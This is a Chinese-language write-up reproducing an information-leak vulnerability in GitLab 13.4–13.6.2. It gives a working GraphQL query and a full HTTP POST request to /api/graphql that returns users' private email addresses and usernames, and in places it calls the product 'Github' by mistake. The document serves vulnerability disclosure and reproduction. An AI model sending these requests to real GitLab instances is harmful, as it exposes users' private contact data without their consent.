**一****：漏洞描述🐑**

GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名

**二:  漏洞影响🐇**

**GitLab 13.4 - 13.6.2**

**三:  漏洞复现🐋**

**转CNVD的时候发现一个Github半公开的信息泄露漏洞**

![](../Images/7c2d0bd8530686a1e56d360d554c749e.png)

在Hackone中看到了有关的报告和修复方法

地址: https://gitlab.com/gitlab-org/gitlab/-/issues/244275  

  

![](../Images/1bd9530bd35d03ce342fb592ffe206e8.png)

**这里报告的意思为调用Graphql的查询方法来返回用户的邮箱，而GitLab的用户邮箱并不是公开的**

**查看有关的 Github与Graphql资料发现**

**Github中是存在 Graphql接口的 **

**接口地址为: ****http://xxx.xxx.xxx.xxx/-//graphql-explorer**

![](../Images/b4e5422e15f247b9a4ba8c9c7d6e5e36.png)

**这里使用报告中的查询方法来获取用户邮箱，而这里的前提却是需要已知的用户名**

**通过查看文档等等，可以调用来返回用户邮箱**

**https://docs.github.com/en/graphql/overview/explorer**

**https://graphql.cn/**

![](../Images/b5bcbc4c39e98634a119f8d2d0e7fcd8.png)

**请求POC为**

*   
*   
*   
*   
*   
*   
*   
*   
*   
*   
*   

```
{users {edges {  node {    username    email
   }  } }}
```

  

同样的通过抓包向接口发送数据也可以返回敏感数据

  

**请求包为**

*   
*   
*   
*

*   

```
POST /api/graphql HTTP/1.1Host: xxx.xxx.xxx.xxxContent-Length: 212Content-Type: application/json
{"query":"{\nusers {\nedges {\n  node {\n    username\n    email\n    avatarUrl\n    status {\n      emoji\n      message\n      messageHtml\n     }\n    }\n   }\n  }\n }","variables":null,"operationName":null}
```

  

![](../Images/af0852104cf51d648b4c34cd238c04ea.png)

成功返回数据，造成 Gitlab的用户邮箱信息泄露
